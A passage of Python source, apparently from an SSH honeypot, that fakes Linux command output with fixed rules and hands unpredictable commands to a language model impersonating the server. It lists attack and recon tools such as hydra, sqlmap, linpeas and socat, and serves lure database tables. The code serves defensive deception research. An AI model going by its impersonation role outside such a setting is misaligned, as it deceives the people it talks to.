        is_active= any(s in svc for s in services)

        if not is_active:
            return (
                f"● {svc}.service\n"
                f"     Loaded: loaded (/lib/systemd/system/{svc}.service; disabled)\n"
                f"     Active: inactive (dead)"
            )

        pid_map  = {"nginx": 841, "apache2": 841, "mysql": 1021, "mysqld": 1021,
                    "redis": 1110, "sshd": 742, "node": 1290, "postgres": 1044}
        pid      = next((v for k, v in pid_map.items() if k in svc), 1000)
        boot_str = time.strftime("%a %Y-%m-%d %H:%M:%S UTC",
                                  time.localtime(state["boot_time"] + 90))
        elapsed  = time.time() - state["boot_time"]
        h, m     = int(elapsed // 3600), int((elapsed % 3600) // 60)

        # Memory varies
        mem_mb = round(random.uniform(8.0, 150.0), 1)

        return (
            f"● {svc}.service\n"
            f"     Loaded: loaded (/lib/systemd/system/{svc}.service; enabled)\n"
            f"     Active: active (running) since {boot_str}; {h}h {m}min ago\n"
            f"    Main PID: {pid} ({svc})\n"
            f"      Tasks: {random.randint(1,8)} (limit: 4915)\n"
            f"     Memory: {mem_mb}M\n"
            f"        CPU: {random.randint(100,2000)}ms\n"
            f"     CGroup: /system.slice/{svc}.service\n"
            f"             └─{pid} /usr/sbin/{svc}"
        )

    if c in ["systemctl list-units --type=service",
             "systemctl list-units --type=service --state=running"]:
        services = profile.get("services", [])
        rows     = ["UNIT                     LOAD   ACTIVE SUB     DESCRIPTION"]
        for svc in services:
            rows.append(f"{svc+'.service':<25}  loaded active running {svc.capitalize()} Service")
        rows.append(f"\n{len(services)} loaded units listed.")
        return "\n".join(rows)

    # ── PACKAGES ─────────────────────────────────────────────

    if c in ["dpkg -l", "dpkg --list"]:
        return (
            "Desired=Unknown/Install/Remove/Purge/Hold\n"
            "| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n"
            "|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)\n"
            "||/ Name           Version          Architecture Description\n"
            "+++-==============-================-============-=====================================\n"
            "ii  bash           5.1-6ubuntu1     amd64        GNU Bourne Again SHell\n"
            "ii  coreutils      8.32-4.1ubuntu1  amd64        GNU core utilities\n"
            "ii  curl           7.81.0-1ubuntu1  amd64        command line tool for transferring data\n"
            "ii  nginx          1.18.0-6ubuntu14 amd64        small, powerful, scalable web/proxy server\n"
            "ii  openssh-server 1:8.9p1-3ubuntu0 amd64        secure shell (SSH) server\n"
            "ii  python3        3.10.6-1         amd64        interactive high-level object-oriented language\n"
            "ii  wget           1.21.2-2ubuntu1  amd64        retrieves files from the web"
        )

    if c in ["apt list --installed", "apt list --installed 2>/dev/null"]:
        return (
            "Listing... Done\n"
            "bash/jammy,now 5.1-6ubuntu1 amd64 [installed]\n"
            "curl/jammy-updates,now 7.81.0-1ubuntu1.13 amd64 [installed]\n"
            "nginx/jammy-updates,now 1.18.0-6ubuntu14.4 amd64 [installed]\n"
            "openssh-server/jammy-updates,now 1:8.9p1-3ubuntu0.6 amd64 [installed]\n"
            "python3/jammy,now 3.10.6-1~22.04 amd64 [installed]\n"
            "wget/jammy,now 1.21.2-2ubuntu1.1 amd64 [installed]"
        )

    # ── MISC ─────────────────────────────────────────────────

    if c in ["lscpu"]:
        return (
            "Architecture:                    x86_64\n"
            "CPU op-mode(s):                  32-bit, 64-bit\n"
            "Byte Order:                      Little Endian\n"
            "CPU(s):                          4\n"
            "Thread(s) per core:              2\n"
            "Core(s) per socket:              2\n"
            "Vendor ID:                       GenuineIntel\n"
            "CPU family:                      6\n"
            "Model name:                      Intel(R) Xeon(R) CPU @ 2.20GHz\n"
            f"CPU MHz:                         {random.uniform(2100, 2300):.3f}\n"
            "Hypervisor vendor:               KVM\n"
            "Virtualization type:             full\n"
            "L1d cache:                       64 KiB\n"
            "L2 cache:                        2 MiB\n"
            "L3 cache:                        55 MiB"
        )

    if c in ["getconf long_bit"]:
        return "64"

    if c in ["du -sh", "du -sh ."]:
        return f"{random.randint(75, 95)}M\t."

    if c.startswith("du -sh "):
        path = c.split(None, 2)[-1]
        return f"{random.randint(1, 200)}M\t{path}"

    if c == "w":
        return (
            f" {_get_live_uptime(state)}\n"
            f"USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n"
            f"{user:<8} pts/0    198.51.100.3    {time.strftime('%H:%M')}    0.00s  0.03s  0.00s w"
        )

    # Only the INTERACTIVE form returns the banner.
    # mysql with -e "query" or piped input runs a query → let the model handle it.
    if (c.startswith("mysql ") or c == "mysql"):
        # SHOW DATABASES and SHOW TABLES have stable output — serve as hard
        # rules (the model occasionally breaks character on these).
        if " -e " in c or c.rstrip().endswith('"'):
            warn = "mysql: [Warning] Using a password on the command line interface can be insecure."
            if "show databases" in c:
                env = profile.get("env", {})
                appdb = env.get("DB_DATABASE", "app_prod")
                return (warn + "\n"
                        "+--------------------+\n"
                        "| Database           |\n"
                        "+--------------------+\n"
                        "| information_schema |\n"
                        f"| {appdb:<18} |\n"
                        "| mysql              |\n"
                        "| performance_schema |\n"
                        "| sys                |\n"
                        "+--------------------+")
            if "show tables" in c:
                env = profile.get("env", {})
                appdb = env.get("DB_DATABASE", "app_prod")
                col = f"Tables_in_{appdb}"
                tables = ["cache", "failed_jobs", "jobs", "migrations",
                          "oauth_access_tokens", "password_resets",
                          "personal_access_tokens", "sessions", "settings", "users"]
                width = max(len(col), max(len(t) for t in tables))
                sep = "+" + "-" * (width + 2) + "+"
                rows = "\n".join(f"| {t:<{width}} |" for t in tables)
                return (warn + "\n" + sep + "\n"
                        f"| {col:<{width}} |\n" + sep + "\n"
                        + rows + "\n" + sep + "\n"
                        f"{len(tables)} rows in set (0.00 sec)")
        if " -e " not in c and not c.endswith(" -e") and "<" not in c and "|" not in c:
            return (
                f"Welcome to the MySQL monitor.  Commands end with ; or \\g.\n"
                f"Your MySQL connection id is {random.randint(10,100)}\n"
                f"Server version: 8.0.33 MySQL Community Server - GPL\n\n"
                f"mysql> "
            )
        # else: fall through (return None later) so the model answers the query

    if (c.startswith("psql ") or c == "psql"):
        if " -c " not in c and not c.endswith(" -c") and "<" not in c and "|" not in c:
            env = profile.get("env", {})
            db  = env.get("DB_DATABASE", "dev_api")
            return f"psql ({db})\nType \"help\" for help.\n\n{db}=# "
        # else: fall through so the model answers the query

    if c.startswith("ssh-keygen"):
        return (
            f"Generating public/private rsa key pair.\n"
            f"Enter file in which to save the key (/root/.ssh/id_rsa):\n"
            f"Enter passphrase (empty for no passphrase):\n"
            f"Enter same passphrase again:\n"
            f"Your identification has been saved in /root/.ssh/id_rsa\n"
            f"Your public key has been saved in /root/.ssh/id_rsa.pub"
        )

    # ── DETERMINISTIC FILE / SYSTEM OPS (instant, predictable) ───
    # These have fixed or trivially-predictable output — no model needed.

    # File operations that succeed silently (no stdout)
    for verb in ["touch ", "mkdir ", "mkdir -p ", "rm ", "rm -f ", "rm -rf ",
                 "rmdir ", "cp ", "cp -r ", "mv ", "ln ", "ln -s ", "chown ",
                 "chgrp ", "kill ", "killall ", "pkill ", "nohup "]:
        if c.startswith(verb):
            return ""

    # which / whereis / type / command -v — fixed binary locations
    BIN_PATHS = {
        "python3": "/usr/bin/python3", "python": "/usr/bin/python",
        "php": "/usr/bin/php", "perl": "/usr/bin/perl", "ruby": "/usr/bin/ruby",
        "node": "/usr/bin/node", "npm": "/usr/bin/npm", "pip3": "/usr/bin/pip3",
        "bash": "/usr/bin/bash", "sh": "/usr/bin/sh", "git": "/usr/bin/git",
        "curl": "/usr/bin/curl", "wget": "/usr/bin/wget", "nc": "/usr/bin/nc",
        "mysql": "/usr/bin/mysql", "redis-cli": "/usr/bin/redis-cli",
        "docker": "/usr/bin/docker", "nmap": "/usr/bin/nmap",
        "gcc": "/usr/bin/gcc", "make": "/usr/bin/make", "vi": "/usr/bin/vi",
        "nano": "/usr/bin/nano", "tar": "/usr/bin/tar", "ssh": "/usr/bin/ssh",
    }
    if c.startswith("which "):
        args = c.split()[1:]
        out = []
        for a in args:
            if a in BIN_PATHS:
                out.append(BIN_PATHS[a])
        return "\n".join(out) if out else ""
    if c.startswith("command -v "):
        a = c.split()[-1]
        return BIN_PATHS.get(a, "")
    if c.startswith("type "):
        a = c.split()[-1]
        if a in BIN_PATHS:
            return f"{a} is {BIN_PATHS[a]}"
        return f"{a}: not found"
    if c.startswith("whereis "):
        a = c.split()[-1]
        if a in BIN_PATHS:
            return f"{a}: {BIN_PATHS[a]}"
        return f"{a}:"

    # echo — return the argument (without redirection, handled elsewhere)
    if c.startswith("echo ") and ">" not in c and "|" not in c and "$" not in c:
        text = command.strip()[5:]
        return text.strip().strip('"').strip("'")

    # sleep — silent success
    if c.startswith("sleep "):
        return ""

    # cat of a file the attacker created this session (from VFS/history)
    # handled earlier by VFS; nothing to do here.

    # ── MISC ─────────────────────────────────────────────────
    # ============================================================
    # If we reach here, no hard rule matched. Decide between:
    #   (a) MODEL  — real Linux command the model should generate
    #   (b) NOT FOUND — command that doesn't exist on a real system
    # ============================================================

    cmd_name = raw.split()[0] if raw.split() else raw
    # strip leading path (e.g. /usr/bin/python3 -> python3)
    if "/" in cmd_name:
        cmd_name = cmd_name.rsplit("/", 1)[1]

    # ---- Commands ALREADY handled by hard rules above (sanity list) ----
    hard_rule_cmds = {
        "ls", "ll", "cat", "grep", "find", "ps", "netstat", "ss", "ip",
        "ifconfig", "wget", "curl", "chmod", "echo", "whoami", "id", "pwd",
        "hostname", "uname", "uptime", "date", "df", "free", "mount",
        "history", "env", "printenv", "sudo", "systemctl", "service",
        "dpkg", "apt", "apt-get", "mysql", "psql", "tail", "head", "arp",
        "route", "lscpu", "nproc", "arch", "w", "who", "last", "groups",
        "getent", "timedatectl", "lsb_release", "du", "lsof", "crontab",
        "ssh-keygen", "cd", "export", "clear", "alias", "set", "source",
        "umask", "eval", "trap", "true", "false", "unset", "readonly",
        "declare", "local", "unalias", "reset",
    }

    # ---- Real commands the MODEL should generate (the LONG TAIL) ----
    # Only genuinely VARIABLE commands whose output cannot be predicted.
    model_cmds = {
        # interpreters running CODE (output depends on the code)
        "python", "python2", "python3", "php", "perl", "ruby", "node",
        "lua", "gawk",
        # package / build (output varies by project state)
        "pip", "pip3", "npm", "npx", "yarn", "gem", "composer", "cargo",
        "go", "javac", "java",
        # databases (output = query results)
        "redis-cli", "mongo", "mongosh", "sqlite3", "mysqldump", "pg_dump",
        # containers / vcs (output = dynamic state)
        "docker", "docker-compose", "kubectl", "podman", "git", "svn",
        # security / recon tools (output = scan results)
        "nmap", "nikto", "hydra", "gobuster", "dirb", "sqlmap", "john",
        "hashcat", "metasploit", "msfconsole", "searchsploit", "wpscan",
        "enum4linux", "masscan", "getcap", "linpeas", "pspy",
        # encoding / hashing / compression (output = transformed data)
        "base64", "base32", "md5sum", "sha1sum", "sha256sum", "sha512sum",
        "xxd", "hexdump", "od", "strings", "file", "tar", "zip", "unzip",
        "gzip", "gunzip", "bzip2", "7z", "openssl",
        # complex text processing (output depends on input)
        "jq", "diff",
        # networking with dynamic output
        "nc", "ncat", "netcat", "socat", "nslookup", "dig", "host",
        "ping", "ping6", "traceroute", "tracepath", "mtr", "telnet",
        "ftp", "sftp", "ssh", "scp", "rsync", "sshpass", "tcpdump",
        # logs / live monitoring (output = system state over time)
        "journalctl", "dmesg", "fail2ban-client", "vmstat", "iostat",
        "mpstat", "sar", "top", "htop", "strace", "ltrace", "lsblk",
        "blkid", "fdisk", "smartctl",
        # account management (output varies)
        "useradd", "usermod", "userdel", "passwd", "chage", "visudo", "su",
    }

    # If it's a model-handled command, fall through to the model
    if cmd_name in model_cmds:
        return None

    # If it's a hard-rule command that reached here with an unusual form,
    # also fall through to the model rather than faking "not found"
    if cmd_name in hard_rule_cmds:
        return None

    # Otherwise it's not a recognized Linux command → not found
    return f"bash: {cmd_name}: command not found"
